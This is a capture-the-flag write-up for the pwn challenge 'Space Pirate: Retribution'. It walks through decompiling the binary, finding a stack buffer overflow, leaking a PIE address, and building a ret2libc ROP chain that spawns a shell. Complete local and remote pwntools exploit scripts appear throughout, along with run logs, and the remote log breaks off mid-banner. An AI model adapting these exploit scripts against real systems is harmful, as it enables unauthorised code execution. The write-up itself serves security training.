# Space Pirate: Retribution

![](Pasted%20image%2020220516164357.png)

![](Pasted%20image%2020220516164344.png)

## Solution

### Decompilation

```
$ file sp_retribution 
sp_retribution: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=418b5fa1bd52c216b4bdbebb95c60340e9f632d4, not stripped
$ 
```

Using cutter to decompile

```c
// WARNING: Variable defined which should be unmapped: buf
// WARNING: Could not reconcile some variable overlaps

void main(void)
{
    void *buf;
    
    setup();
    banner();
    do {
        while( true ) {
            while( true ) {
                printf("\n%s1. Show missiles 🚀\n2. Change target\'s location 🎯\n>> ", 0xd78);
                read(0, &buf, 2);
                if ((char)buf != '1') break;
                show_missiles();
            }
            if ((char)buf == '2') break;
            printf("\n%s[-] Invalid option! Exiting..\n\n", 0xd70);
            exit(0x520);
        }
        missile_launcher();
    } while( true );
}
```

```c

void missile_launcher(void)
{
    void *var_50h;
    int64_t var_48h;
    int64_t var_40h;
    int64_t var_38h;
    char *buf;
    int64_t var_10h;
    int64_t var_8h;
    
    var_8h = 0x53e5854620fb399f;
    var_10h = 0x576b96b95df201f9;
    printf("\n[*] Current target\'s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinates: x = [0x%lx], y = "
           , 0x53e5854620fb399f, 0x576b96b95df201f9, 0x53e5854620fb399f);
    var_50h = (void *)0x0;
    var_48h = 0;
    var_40h = 0;
    var_38h = 0;
    read(0, &buf, 0x1f);
    printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", &buf);
    read(0, &var_50h, 0x84); // Looks suspicious, reading way too much input
    printf("\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!%s\n", 0xd70, 
           0xd78);
    return;
}
```

The `show_missiles()` function is useless and just displays characters, not taking in any input. There is a suspicious input in the `missile_launcher()` function, address `0x00000ac5`, with the `read` having such a large input size of `0x84` characters. Sounds like a buffer overflow...

### Testing Inputs

I tested the suspicious input, opening it in EDB, generating a pattern from this [website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and putting it in the vulnerable input

```bash
(base) [hacker@hackerbook challenge]$ ./sp_retribution 


                                 Missile Launcher!


                                                                                
                                                                                
                                                                                
                                                                                
                       ░                                                        
                                                        ░      ░                
                                                     ▓▓             ░           
                                                 ▓▓▓▓▓▓              ▒          
             ▒  ▒                              ▓▓▓▓▓▓▓▓▓▓                       
                                             ▓▓▓▓▓▓▓▓▓▓▓▓▓            ░         
                                            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ░         
                                           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ░         
                                         ▓▓▓▓▓▓▒▒░▒░▒░▓▓▓▓▓▓▓▓▓▓▓               
                                       ▓▓▓▓▓▓▒▒       ░░▓▓▓▓▓▓▓▓▓▓▓▓▓           
                                     ▒▓▓▓▓▓▓▓▒         ░░▓▓▓▓▓▓▓▓▓▓▓            
                                    ▓▓▓▓▓▓▓▓▒▒          ░▓▓▓▓▓▓▓▓▓▓             
                                  ▒▓▓▓▓▓▓▓▓▓▓▒         ░▓▓▓▓▓▓▓▓▓               
                          ░       ▓▓▓▓▓▓▓▓▓▓▓▓▒░░   ░░░▓▓▓▓▓▓▓▓                 
                                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ ▓▓▓▓▓▓▓▓                    
                               ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      
                             ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         
                  ▒         ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓                           
                           ▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓                              
                           ▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓                                  
                         ░  ▓▓    ▓▓▓▓▓▓▓▓▓▓                                    
      ▓                 ▒░      ▓▓▓▓▓▓▓▓                                        
                     ░▒▒  ▓      ▓▓▓▓▓        ▒                     ▒           
                   ░▒▒                                              ▓           
                  ▒▒▒       ▒▒                                                  
                ░▒▒░      ▒▒░       ░                                           
               ░▒▒░   ░▒▒▒░         ░                                           
              ░▒▒▒▒▒▒▒▒░            ▒                                           
             ▒▒▒▒▒▒▒░                                                           
            ░▒▒▒▒                                                               
           ░░                                               ▒                   



1. Show missiles 🚀
2. Change target's location 🎯
>> 1

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Missile #1 stats: 🚀

[Power]: ▋▋▋▋

[Range]: ▋▋▋▋▋

[Speed]: ▋▋▋▋▋▋▋▋

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Missile #2 stats: ☄️

[Power]: ▋▋▋▋▋▋▋▋▋

[Range]: ▋▋▋▋▋▋▋▋

[Speed]: ▋▋

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

1. Show missiles 🚀
2. Change target's location 🎯
>> 2

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = a

[*] New coordinates: x = [0x53e5854620fb399f], y = a
@�#V
[*] Verify new coordinates? (y/n): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!
```

![](Pasted%20image%2020220514234701.png)

![](Pasted%20image%2020220514234822.png)

### Finding Bad Characters

I used this python file

```python
import os
import time
def exploit(payload, RHOST, RPORT):
    prefix = "2\n"+("1"+ " " * (0x1f-2)+"\n")
    offset = 80
    overflow = "A" * offset
    retn = "BBBB"# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = "\n"

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    time.sleep(10)
    print("Sending Data")
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
#with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 

exploit(payload, '127.0.0.1', 4444)
```

```bash
(base) [hacker@hackerbook challenge]$ nc -nlvp 4444 -e ./sp_retribution
Connection from 127.0.0.1:53916
Alarm clock
(base) [hacker@hackerbook challenge]$ 
```

```bash
[hacker@hackerbook Binary Exploitation Template]$ python2 3_finding_bad_char.py 
Sending Data
[hacker@hackerbook Binary Exploitation Template]$ 
```

![](Pasted%20image%2020220515000557.png)

Missing `0x31` onwards. Either the buffer has limits or its a bad character

![](Pasted%20image%2020220515000615.png)


However, even if I change the respective part of the code, the other characters still can show up

```python
### bad Characters ##############
pp = ""
for x in range(0x31, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
#with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 

exploit(payload, '127.0.0.1', 4444)
```

![](Pasted%20image%2020220515001023.png)

Most likely no bad characters anyway. But now, I have a good idea of the buffer size

### Return Instruction Address

```
$ ROPgadget --binary sp_retribution
...
0x0000000000000746 : ret
...
```

### Trying MSFvenom Payload

![](Pasted%20image%2020220515003302.png)

![](Pasted%20image%2020220515003517.png)

### Getting Past PIE

On testing inputs, I found out that weird characters appear on the screen sometimes (when only newline is input in)

![](Pasted%20image%2020220516141523.png)

![](Pasted%20image%2020220516141827.png)


#### Leak from stack

Using some code, I managed to get a leak of the base address to overcome PIE

```bash
1. Show missiles 🚀
2. Change target's location 🎯
>> 

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
### Processing Output ########################

[*] New coordinates: x = [0x53e5854620fb399f], y = 
 #\x82U
[*] Verify new coordinates? (y/n): 
['', '[*] New coordinates: x = [0x53e5854620fb399f], y = ', '\r #\x82U', '[*] Verify new coordinates? (y/n): ']
['\r #\x82U']
('\r', '0d')
(' ', '20')
('#', '23')
('\x82', '82')
('U', '55')
\x55\x82\x23\x20\x0d\x0a
[*] Switching to interactive mode
$  
```

![](Pasted%20image%2020220516143501.png)

![](Pasted%20image%2020220516143959.png)


#### Calculating respective addresses

I calculated it as such

```python
### 4: Finding return address #####################################
'''
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> ROPgadget --binary malbec.exe | grep 0x41101503
0x41101503 : push esp ; ret
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> 
'''
from pwn import *
from pprint import pprint

context(os="linux", arch="amd64")
elf = context.binary = ELF("sp_retribution") #ELF("challenge/sp_retribution")
libc = ELF("glibc/libc.so.6")
rop = ROP(elf)

pprint(elf.symbols)


### Running Program ####################################
io = process("./sp_retribution")
print(io.recv())
io.send("2")
print(io.recv())
io.send("\n")
print("### Processing Output ########################")
data = io.recv()
print(data)
print(data.split('\n'))

vuln = '\n' + data.split('\n')[2] 
print([vuln])

### Calculation ##############################
def hex_vis(vuln, prefix="\\x"):
    out = ""
    for character in vuln:
        #print(character, character.encode('hex'))
        out = prefix + character.encode('hex') + out
    return out

def hex_vis_2(vuln):
    return "0x"+hex_vis(vuln, "")

print(hex_vis(vuln))
out = hex_vis_2(vuln)
print(out)

offset = 0x0d0a
address_found = eval(out)
address_base = address_found - offset
print(hex_vis(p64(address_base)))
address_main = address_base + elf.symbols['main']
print(hex_vis(p64(address_main)))

io.interactive()
#exploit(payload, remote('127.0.0.1', 4444))
#exploit(payload, process("/tmp/challenge/sp_retribution"))
#exploit(payload, '64.227.37.214', 32106)
```

```bash

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
### Processing Output ########################

[*] New coordinates: x = [0x53e5854620fb399f], y = 
�I�U
[*] Verify new coordinates? (y/n): 
['', '[*] New coordinates: x = [0x53e5854620fb399f], y = ', '\r\xc0I\xf4U', '[*] Verify new coordinates? (y/n): ']
['\n\r\xc0I\xf4U']
\x55\xf4\x49\xc0\x0d\x0a
0x55f449c00d0a
\x00\x00\x55\xf4\x49\xc0\x00\x00
\x00\x00\x55\xf4\x49\xc0\x0c\x39
[*] Switching to interactive mode
$  
```

![](Pasted%20image%2020220516145437.png)


#### Redirection of Code Flow

```python
### 4: Finding return address #####################################
'''
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> ROPgadget --binary malbec.exe | grep 0x41101503
0x41101503 : push esp ; ret
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> 
'''
from pwn import *
from pprint import pprint

context(os="linux", arch="amd64")
elf = context.binary = ELF("sp_retribution") #ELF("challenge/sp_retribution")
libc = ELF("glibc/libc.so.6")
rop = ROP(elf)

pprint(elf.symbols)

### 5: Exploit ######################################################

import os
import time

def overflow(ropchain):
    prefix = ""
    offset = 80
    overflow = "A" * offset
    rbp = "A" * 8
    #retn = "" 
    #padding = "" #+ "\xcc"
    postfix = "\n"
    #buffer = overflow + rbp + retn + padding + payload + postfix
    buffer = overflow + rbp + ropchain #+ postfix
    return buffer
##################################### 

pop_rdi = rop.find_gadget(["ret"])[0]

print( rop.find_gadget(["pop rdi", "ret"]))
payload = ""
payload += p64(elf.symbols['show_missiles'])
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)

### Running Program ########################################
io = process("./sp_retribution")
print(io.recv())
io.send("2")
print(io.recv())
io.send("\n")
print("### Processing Output ########################")
data = io.recv()
print(data)
print(data.split('\n'))

vuln = '\n' + data.split('\n')[2] 
print([vuln])

### Calculation ##############################
def hex_vis(vuln, prefix="\\x"):
    out = ""
    for character in vuln:
        #print(character, character.encode('hex'))
        out = prefix + character.encode('hex') + out
    return out

def hex_vis_2(vuln):
    return "0x"+hex_vis(vuln, "")

print(hex_vis(vuln))
out = hex_vis_2(vuln)
print(out)

offset = 0x0d0a
address_found = eval(out)
address_base = address_found - offset
print(hex_vis(p64(address_base)))
address_main = address_base + elf.symbols['main']
print(hex_vis(p64(address_main)))

### Jump to Main #################################
address_show = address_base + elf.symbols['show_missiles']
io.send(overflow(p64(address_show)))

io.interactive()
#exploit(payload, remote('127.0.0.1', 4444))
#exploit(payload, process("/tmp/challenge/sp_retribution"))
#exploit(payload, '64.227.37.214', 32106)
```

```bash
1. Show missiles 🚀
2. Change target's location 🎯
>> 

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
### Processing Output ########################

[*] New coordinates: x = [0x53e5854620fb399f], y = 
��\x8bU
[*] Verify new coordinates? (y/n): 
['', '[*] New coordinates: x = [0x53e5854620fb399f], y = ', '\r\xc0\xab\x8bU', '[*] Verify new coordinates? (y/n): ']
['\n\r\xc0\xab\x8bU']
\x55\x8b\xab\xc0\x0d\x0a
0x558babc00d0a
\x00\x00\x55\x8b\xab\xc0\x00\x00
\x00\x00\x55\x8b\xab\xc0\x0c\x39
[*] Switching to interactive mode

[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Missile #1 stats: 🚀

[Power]: ▋▋▋▋

[Range]: ▋▋▋▋▋

[Speed]: ▋▋▋▋▋▋▋▋

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Missile #2 stats: ☄️

[Power]: ▋▋▋▋▋▋▋▋▋

[Range]: ▋▋▋▋▋▋▋▋

[Speed]: ▋▋

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Got EOF while reading in interactive
$  
```

### ROP Chaining

Now I can finally start on the ROP chain. There are 2 ROP chains needed, 1 to leak the `puts` address to find libc, and the other to call the shell

For the first ROP Chain, I called the puts function with the `puts` address on the GOT, calculated the address of system

I used that to run another ROP chain to pop binsh string into the rdi register and run the `system` function to get a shell.

```python
from pwn import *
from pprint import pprint

debug = lambda x: None
#def debug(x): print(x)

### PwnTools Setup #################################################

context(os="linux", arch="amd64")
elf = context.binary = ELF("sp_retribution") #ELF("challenge/sp_retribution")
libc = ELF("glibc/libc.so.6")
rop = ROP(elf)
#pprint(elf.symbols)

### 5: Exploit ######################################################

import os
import time

def overflow(ropchain):
    prefix = ""
    offset = 80
    overflow = "A" * offset
    rbp = "A" * 8
    #retn = "" 
    #padding = "" #+ "\xcc"
    postfix = "\n"
    #buffer = overflow + rbp + retn + padding + payload + postfix
    buffer = overflow + rbp + ropchain #+ postfix
    return buffer


### Running Program ###########################################
io = process("./sp_retribution")
debug(io.recv())
io.send("2")
debug(io.recv())
io.send("\n")
print("### Processing Output ########################")
data = io.recv()
debug(data)
debug(data.split('\n'))

vuln = '\n' + data.split('\n')[2] 
debug([vuln])

### Calculation ##############################
def hex_vis(vuln, prefix="\\x"):
    out = ""
    for character in vuln:
        #print(character, character.encode('hex'))
        out = prefix + character.encode('hex') + out
    return out

def hex_vis_2(vuln):
    return "0x"+hex_vis(vuln, "")

debug(hex_vis(vuln))
out = hex_vis_2(vuln)
debug(out)

offset = 0x0d0a
address_found = eval(out)
address_base = address_found - offset
debug(hex_vis(p64(address_base)))
address_main = address_base + elf.symbols['main']
debug(hex_vis(p64(address_main)))

### Generating ROPChain ########################################

def ropchain_overflow(chain, address_base):
    chain_payload = ""
    for link in chain:
        #print(link)
        if type(link) != tuple:
            offset = link
            new_address = address_base + offset
        elif type(link) == tuple:
            offset = link[0]
            new_address = link[1] + offset
        chain_payload += p64(new_address)
        #print("Address:", hex_vis_2(p64(offset)), "->", hex_vis_2(p64(new_address)))

    return overflow(chain_payload)

#print("Hex: " + hex_vis_2(p64(elf.got.puts)))

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
io.send(ropchain_overflow([
    pop_rdi, 
    elf.got.puts,
    elf.plt.puts,
    elf.symbols['main'],
    elf.symbols['show_missiles']
], address_base))

data = io.recv().split('\n')
puts_leak = eval(hex_vis_2(data[2]))
print(hex_vis_2(data[2]))


#io.interactive()
### Going back to overflow #################################
io.send("2")
debug(io.recv())
io.send("\n")
debug(io.recv())

### ROPChain 2 ##############################################
libc.address = puts_leak - libc.sym["puts"]
SYSTEM = libc.sym["system"]
BINSH = next(libc.search("/bin/sh")) 

log.info("libc: %s " % hex(libc.address))
log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

#time.sleep(10)

io.send(ropchain_overflow([
    rop.find_gadget(["ret"])[0],
    rop.find_gadget(["pop rdi", "ret"])[0], 
    (BINSH, 0), 
    (SYSTEM, 0), 
    #elf.symbols['main'],
], address_base))

io.interactive()
```

```(base) [hacker@hackerbook Local Exploit]$ python2 exploit.py 
[*] '/run/media/hacker/Windows/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2022/Cyber Apocalypse CTF 2022 - Intergalactic Chase/Pwn/Space Pirate - Retribution/Local Exploit/sp_retribution'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './glibc/'
[*] '/run/media/hacker/Windows/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2022/Cyber Apocalypse CTF 2022 - Intergalactic Chase/Pwn/Space Pirate - Retribution/Local Exploit/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for 'sp_retribution'
[+] Starting local process './sp_retribution': pid 56758


                                 Missile Launcher!


                                                                                
                                                                                
                                                                                
                                                                                
                       ░                                                        
                                                        ░      ░                
                                                     ▓▓             ░           
                                                 ▓▓▓▓▓▓              ▒          
             ▒  ▒                              ▓▓▓▓▓▓▓▓▓▓                       
                                             ▓▓▓▓▓▓▓▓▓▓▓▓▓            ░         
                                            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ░         
                                           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ░         
                                         ▓▓▓▓▓▓▒▒░▒░▒░▓▓▓▓▓▓▓▓▓▓▓               
                                       ▓▓▓▓▓▓▒▒       ░░▓▓▓▓▓▓▓▓▓▓▓▓▓           
                                     ▒▓▓▓▓▓▓▓▒         ░░▓▓▓▓▓▓▓▓▓▓▓            
                                    ▓▓▓▓▓▓▓▓▒▒          ░▓▓▓▓▓▓▓▓▓▓             
                                  ▒▓▓▓▓▓▓▓▓▓▓▒         ░▓▓▓▓▓▓▓▓▓               
                          ░       ▓▓▓▓▓▓▓▓▓▓▓▓▒░░   ░░░▓▓▓▓▓▓▓▓                 
                                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ ▓▓▓▓▓▓▓▓                    
                               ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      
                             ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         
                  ▒         ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓                           
                           ▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓                              
                           ▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓                                  
                         ░  ▓▓    ▓▓▓▓▓▓▓▓▓▓                                    
      ▓                 ▒░      ▓▓▓▓▓▓▓▓                                        
                     ░▒▒  ▓      ▓▓▓▓▓        ▒                     ▒           
                   ░▒▒                                              ▓           
                  ▒▒▒       ▒▒                                                  
                ░▒▒░      ▒▒░       ░                                           
               ░▒▒░   ░▒▒▒░         ░                                           
              ░▒▒▒▒▒▒▒▒░            ▒                                           
             ▒▒▒▒▒▒▒░                                                           
            ░▒▒▒▒                                                               
           ░░                                               ▒                   



1. Show missiles 🚀
2. Change target's location 🎯
>> 

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 
### Processing Output ########################

[*] New coordinates: x = [0x53e5854620fb399f], y = 
`\xb3\xbfU
[*] Verify new coordinates? (y/n): 
['', '[*] New coordinates: x = [0x53e5854620fb399f], y = ', '\r`\xb3\xbfU', '[*] Verify new coordinates? (y/n): ']
['\n\r`\xb3\xbfU']
\x55\xbf\xb3\x60\x0d\x0a
0x55bfb3600d0a
\x00\x00\x55\xbf\xb3\x60\x00\x00
\x00\x00\x55\xbf\xb3\x60\x0c\x39
0x7fcf3b5dc6a0

[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]

[*] Insert new coordinates: x = [0x53e5854620fb399f], y = 

[*] New coordinates: x = [0x53e5854620fb399f], y = 
`\xb3\xbfU
[*] Verify new coordinates? (y/n): 
[*] libc: 0x7fcf3b56d000 
[*] bin/sh: 0x7fcf3b6f9e57 
[*] system: 0x7fcf3b5b23a0 
[*] Switching to interactive mode

[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!
$ ls
exploit.py  glibc  sp_retribution
$ exit

```

## Remote Exploit
```python
from pwn import *
from pprint import pprint

debug = lambda x: None
def debug(x): print(x)

### PwnTools Setup #################################################
context(os="linux", arch="amd64")
elf = context.binary = ELF("sp_retribution") #ELF("challenge/sp_retribution")
libc = ELF("glibc/libc.so.6")
rop = ROP(elf)
#pprint(elf.symbols)

### 5: Exploit ######################################################

import os
import time

def overflow(ropchain):
    prefix = ""
    offset = 80
    overflow = "A" * offset
    rbp = "A" * 8
    #retn = "" 
    #padding = "" #+ "\xcc"
    postfix = "\n"
    #buffer = overflow + rbp + retn + padding + payload + postfix
    buffer = overflow + rbp + ropchain #+ postfix
    return buffer


### Running Program ###########################################
#io = process("./sp_retribution")
#RHOST, RPORT = raw_input("IP: ").split(":")
RHOST, RPORT = "157.245.46.136:31648".split(":")
RPORT = int(RPORT)
io = remote(RHOST,RPORT)

debug(io.recv())
io.send("2\n")
debug(io.recv())
debug(io.recv())
time.sleep(2)
io.send("\n")
print("### Processing Output ########################")
data = io.recv()
debug(data)
debug(data.split('\n'))

vuln = '\n' + data.split('\n')[2] 
debug("vuln: "+ str([vuln]))

### Calculation ##############################
def hex_vis(vuln, prefix="\\x"):
    out = ""
    for character in vuln:
        #print(character, character.encode('hex'))
        out = prefix + character.encode('hex') + out
    return out

def hex_vis_2(vuln):
    return "0x"+hex_vis(vuln, "")

debug(hex_vis(vuln))
out = hex_vis_2(vuln)
debug(out)

offset = 0x0d0a
address_found = eval(out)
address_base = address_found - offset
debug(hex_vis(p64(address_base)))
address_main = address_base + elf.symbols['main']
debug(hex_vis(p64(address_main)))

### Generating ROPChain ########################################

def ropchain_overflow(chain, address_base):
    chain_payload = ""
    for link in chain:
        #print(link)
        if type(link) != tuple:
            offset = link
            new_address = address_base + offset
        elif type(link) == tuple:
            offset = link[0]
            new_address = link[1] + offset
        chain_payload += p64(new_address)
        #print("Address:", hex_vis_2(p64(offset)), "->", hex_vis_2(p64(new_address)))

    return overflow(chain_payload)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
io.send(ropchain_overflow([
    pop_rdi, 
    elf.got.puts,
    elf.plt.puts,
    elf.symbols['main'],
    elf.symbols['show_missiles']
], address_base))

data = io.recv().split('\n')
puts_leak = eval(hex_vis_2(data[2]))
print(hex_vis_2(data[2]))


#io.interactive()
### Going back to overflow #################################
io.send("2")
debug(io.recv())
io.send("\n")
debug(io.recv())

### ROPChain 2 ##############################################
libc.address = puts_leak - libc.sym["puts"]
SYSTEM = libc.sym["system"]
BINSH = next(libc.search("/bin/sh")) 

log.info("libc: %s " % hex(libc.address))
log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

#time.sleep(10)

io.send(ropchain_overflow([
    rop.find_gadget(["ret"])[0],
    rop.find_gadget(["pop rdi", "ret"])[0], 
    (BINSH, 0), 
    (SYSTEM, 0), 
    #elf.symbols['main'],
], address_base))

io.interactive()
```

If it fails, just run again. Chances are it could be network error

```bash
(base) [hacker@hackerbook Final Exploit]$ ls
exploit.py  glibc  sp_retribution
(base) [hacker@hackerbook Final Exploit]$ 
(base) [hacker@hackerbook Final Exploit]$ python2 exploit.py 
[*] '/run/media/hacker/Windows/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2022/Cyber Apocalypse CTF 2022 - Intergalactic Chase/Pwn/Space Pirate - Retribution/Final Exploit/sp_retribution'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './glibc/'
[*] '/run/media/hacker/Windows/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2022/Cyber Apocalypse CTF 2022 - Intergalactic Chase/Pwn/Space Pirate - Retribution/Final Exploit/glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for 'sp_retribution'
[+] Opening connection to 138.68.139.197 on port 30635: Done


                                 Missile Launcher!


                                                                                
                                                                                
                                                                                
                                                                                
                       ░                                                        
                                                        ░      ░                
                                                     ▓▓             ░           
                                                 ▓▓▓▓▓▓              ▒          
             ▒  ▒                              ▓▓▓▓▓▓▓▓▓▓                       
                                             ▓▓▓▓▓▓▓▓▓▓▓▓▓            ░         
                                            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ░         
                                           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ░         
                                         ▓▓▓▓▓▓▒▒░▒░▒░▓▓▓▓▓▓▓▓▓▓▓               
                                       ▓▓▓▓▓▓▒▒       ░░▓▓�
\x96\x93▓▓▓▓▓▓▓▓▓▓           
                                     ▒▓▓▓▓▓▓▓▒         ░░▓▓▓▓▓▓▓▓▓▓▓            
                                    ▓▓▓▓▓▓▓▓▒▒          ░▓▓▓▓▓▓▓▓▓▓             
                                  ▒▓▓▓▓▓▓▓▓▓▓▒         ░▓▓▓▓▓▓▓▓▓               
                          ░       ▓▓▓▓▓▓▓▓▓▓▓▓▒░░   ░░░▓▓▓▓▓▓▓▓                 
                                ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ ▓▓▓▓▓▓▓▓                    
                               ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      
                             ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         
